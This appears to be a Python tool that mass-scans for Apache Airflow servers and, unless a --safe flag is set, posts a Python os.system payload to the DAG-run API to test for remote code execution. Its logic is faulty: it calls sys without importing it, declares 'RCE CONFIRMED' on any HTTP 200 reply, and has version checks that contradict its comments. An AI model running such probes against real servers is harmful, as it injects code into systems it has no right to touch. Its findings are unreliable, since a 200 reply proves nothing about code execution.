#!/usr/bin/env python3
"""
Apache Airflow DAG Configuration RCE Scanner
============================================
This tool scans for Remote Code Execution (RCE) vulnerabilities in misconfigured 
Apache Airflow DAGs. Vulnerabilities in improperly secured DAG inputs can allow 
attackers to inject arbitrary Python code, resulting in full server compromise.

Affected systems:
  - Apache Airflow instances with default authentication and unsafe DAG permissions  
  - Versions that expose the "trigger_dag" or "update_task" endpoints without proper restrictions

Potential impact:
  - Remote code execution via Python payload injection in DAG configurations
  - Unauthorized control over scheduled tasks

Vulnerability Summary:
  - Many organizations using Apache Airflow leave the default public configuration
    for DAG access.
  - DAGs define workflows, including the ability to execute OS commands via Python
    operators, making them a potential entry point for attackers.
  - The issue stems from improper handling of task arguments and poor authorization
    around the endpoint access.

This tool performs the following actions:
  1. Detects publicly-accessible Apache Airflow web servers.
  2. Identifies and fingerprints Airflow version.
  3. Actively checks for RCE by attempting to execute harmless code.

!!! WARNING !!!
Use the `--safe` flag for detection-only scans without executing payloads.

Usage:
  # Scan a single target (active probe, executes a harmless payload)
  python apache_airflow_dag_rce_scanner.py --target http://airflow.example.com:8080
  
  # Detection only — no RCE probes
  python apache_airflow_dag_rce_scanner.py --target http://airflow.example.com:8080 --safe

  # Bulk scan from file
  python apache_airflow_dag_rce_scanner.py --list airflow_hosts.txt --output results.json

  # Disable TLS verification
  python apache_airflow_dag_rce_scanner.py --target https://airflow.example.com --no-verify

References:
  - https://airflow.apache.org/
  - https://www.trellix.com/en-us/about/newsroom/stories/research/critical-vulnerabilities-in-apache-airflow.html
  - https://cwe.mitre.org/data/definitions/20.html
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from typing import Optional
import httpx
import re

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME     = "apache_airflow_dag_rce_scanner"
CVE_ID        = "MULTI"
CVSS          = "9.1"  # Estimated for affected vulnerabilities

REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

DETECTION_PATHS = [
    "/home",
    "/api/v1/config",
    "/static/app.css",
]

AIRFLOW_HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; RCE-scanner/1.0; +https://security-research)"
}

VERSION_REGEX = re.compile(r'Apache Airflow (\d+\.\d+\.\d+)')
VULNERABLE_VERSIONS = [
    (1, 10, 14), # Below version 1.10.15
    (2, 3, 0),   # Below version 2.3.1
]

# Test payload for RCE
RCE_PAYLOAD = {
    "dag_run_id": "scanner_test",
    "conf": {"code": "import os; os.system('echo harmless_rce_test')"},
}


def version_is_vulnerable(version: str) -> bool:
    """Check if the extracted version is vulnerable."""
    parsed_version = tuple(map(int, version.split('.')))
    for major, minor, patch in VULNERABLE_VERSIONS:
        if parsed_version < (major, minor, patch):
            return True
    return False


async def probe(target: str, path: str, client: httpx.AsyncClient) -> Optional[str]:
    """Probes the given path for Airflow fingerprints or version info."""
    try:
        url = f"{target.rstrip('/')}{path}"
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            # Check for the presence of Airflow-specific strings
            if "Apache Airflow" in response.text or "DAGs" in response.text:
                match = VERSION_REGEX.search(response.text)
                if match:
                    return match.group(1)
        return None
    except Exception:
        return None


async def check_rce(target: str, client: httpx.AsyncClient) -> bool:
    """Attempts to execute an RCE payload on the target."""
    try:
        url = f"{target.rstrip('/')}/api/v1/dags/{RCE_PAYLOAD['dag_run_id']}/dagRuns"
        response = await client.post(url, json=RCE_PAYLOAD, timeout=REQUEST_TIMEOUT)
        return response.status_code == 200
    except Exception:
        return False


async def scan_target(target: str, safe: bool, semaphore: asyncio.Semaphore, no_verify: bool) -> dict:
    """Scans a single target for Apache Airflow RCE vulnerability."""
    async with semaphore:
        async with httpx.AsyncClient(verify=not no_verify, headers=AIRFLOW_HEADERS) as client:
            finding = {
                "target": target,
                "fingerprint": None,
                "version": None,
                "vulnerable": False,
                "rce_tested": False,
                "rce_possible": False,
                "error": None,
            }

            try:
                for path in DETECTION_PATHS:
                    version = await probe(target, path, client)
                    if version:
                        finding["fingerprint"] = "Apache Airflow"
                        finding["version"] = version
                        finding["vulnerable"] = version_is_vulnerable(version)
                        break

                if finding["vulnerable"] and not safe:
                    finding["rce_tested"] = True
                    finding["rce_possible"] = await check_rce(target, client)

            except Exception as e:
                finding["error"] = str(e)

            return finding


async def main(args):
    """Main function to coordinate scanning."""
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    output_file = args.output
    semaphore = asyncio.Semaphore(args.concurrency)
    results = []

    tasks = [
        scan_target(target, args.safe, semaphore, args.no_verify)
        for target in targets
    ]
    results = await asyncio.gather(*tasks)

    # JSON output
    if output_file:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=4)

    # Console output
    for result in results:
        if result["vulnerable"]:
            print(f"{c(RED, '[CRITICAL]')}: {result['target']} is vulnerable! Version: {result['version']}")
            if result["rce_tested"] and result["rce_possible"]:
                print(f"    {c(RED, 'RCE CONFIRMED!')}")
        elif result["fingerprint"]:
            print(f"{c(YELLOW, '[INFO]')}: {result['target']} detected as {result['fingerprint']}, version {result['version']}")
        elif result["error"]:
            print(f"{c(RED, '[ERROR]')}: {result['target']} - {result['error']}")
        else:
            print(f"{c(GREEN, '[INFO]')}: {result['target']} does not appear to be vulnerable.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Apache Airflow DAG Configuration RCE Scanner")
    parser.add_argument("--target", help="Single target URL (e.g., http://airflow.example.com:8080)")
    parser.add_argument("--list", help="File containing list of target URLs")
    parser.add_argument("--output", help="Output file (JSON)")
    parser.add_argument("--safe", action="store_true", help="Enable detection-only mode (no RCE probes)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")

    args = parser.parse_args()

    if not (args.target or args.list):
        print(c(RED, "Error: Either --target or --list must be specified."))
        parser.print_help()
        sys.exit(1)

    asyncio.run(main(args))
